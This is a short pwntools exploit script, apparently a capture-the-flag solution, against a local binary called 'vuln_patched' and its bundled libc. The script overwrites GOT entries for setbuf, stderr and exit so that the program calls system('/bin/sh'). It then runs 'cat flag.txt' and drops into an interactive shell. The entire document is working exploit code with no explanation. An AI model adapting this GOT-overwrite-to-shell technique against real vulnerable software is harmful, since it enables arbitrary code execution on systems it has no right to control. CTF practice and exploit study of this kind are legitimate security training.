from pwn import *

context.binary = elf = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
conn = process()

#gdb.attach(conn)

setbuf_off = (elf.got.setbuf - elf.sym.buf)
stderr_off = (elf.sym.stderr - elf.sym.buf)
exit_off = (elf.got.exit - elf.sym.buf)

sys_off = (libc.sym.system - libc.sym.setbuf)
sh_off = (next(libc.search(b"/bin/sh")) - libc.sym._IO_2_1_stderr_)
main_off = (elf.sym.main - 0x1080) # unresolved exit and main are at fixed offsets from each other

conn.recvuntil(b"?")
conn.sendline(str(setbuf_off).encode())
conn.recvuntil(b"?")
conn.sendline(str(sys_off).encode())
conn.recvuntil(b"?")
conn.sendline(str(stderr_off).encode())
conn.recvuntil(b"?")
conn.sendline(str(sh_off).encode())
conn.recvuntil(b"?")
conn.sendline(str(exit_off).encode())
conn.recvuntil(b"?")
conn.sendline(str(main_off).encode())
conn.recvuntil(b"?")
conn.sendline(b"1337")
conn.recvuntil(b"?")
conn.sendline(b"1337")
conn.sendline(b"cat flag.txt")


conn.interactive()
